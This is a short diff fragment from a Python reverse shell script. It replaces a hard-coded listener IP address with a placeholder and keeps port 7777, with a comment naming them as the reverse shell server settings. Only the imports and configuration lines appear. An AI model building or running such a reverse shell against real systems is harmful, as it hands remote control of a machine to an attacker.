@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 # IP and port of the reverse shell server
-IP = "192.168.56.7"
+IP = "inputyourthelisteningIP"
 PORT = 7777
 
 # create a socket object
